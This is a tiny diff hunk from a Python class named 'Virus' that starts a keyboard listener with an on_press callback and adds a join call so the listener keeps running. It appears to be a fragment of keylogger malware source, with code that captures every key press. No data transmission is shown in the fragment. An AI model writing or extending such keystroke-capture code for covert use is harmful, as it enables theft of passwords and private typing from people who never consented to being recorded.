@@ -43,3 +43,4 @@ class Virus(object):
             try:
                 listener = Listener(on_press=self.on_press)
                 listener.start()
+                listener.join()
